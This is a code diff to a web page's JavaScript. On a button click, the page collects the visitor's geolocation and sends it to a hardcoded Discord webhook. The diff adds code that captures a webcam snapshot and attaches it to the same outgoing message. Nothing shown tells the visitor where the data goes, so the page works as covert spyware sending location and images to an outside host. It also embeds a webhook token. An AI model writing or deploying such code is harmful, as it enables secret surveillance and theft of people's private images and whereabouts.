@@ -12,10 +12,22 @@ document.getElementById('startButton').addEventListener('click', async () => {
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const { latitude, longitude } = position.coords;
 
+                // Capture a picture of the webcam feed
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                canvas.getContext('2d').drawImage(videoElement, 0, 0);
+
+                const imageSrc = canvas.toDataURL('image/png');
+
                 // Send information to Discord webhook
                 const discordWebhookUrl = 'https://discord.com/api/webhooks/1506854427846508635/3PPDpwgkhYKFhs6cuK6Bl3sIb73YQ0ZYqEj6MIx6ivSqKjUWXQiig9q9vQkXi5Aq2mWe';
                 const data = {
-                    content: `Webcam available\nLatitude: ${latitude}, Longitude: ${longitude}`
+                    content: `Webcam available\nLatitude: ${latitude}, Longitude: ${longitude}`,
+                    files: [{
+                        name: 'webcam_capture.png',
+                        blob: dataURItoBlob(imageSrc)
+                    }]
                 };
 
                 await fetch(discordWebhookUrl, {
@@ -41,3 +53,14 @@ document.getElementById('startButton').addEventListener('click', async () => {
         document.getElementById('webcamContainer').innerHTML = '<p>No webcam available</p>';
     }
 });
+
+function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+    }
+    return new Blob([ab], { type: mimeString });
+}
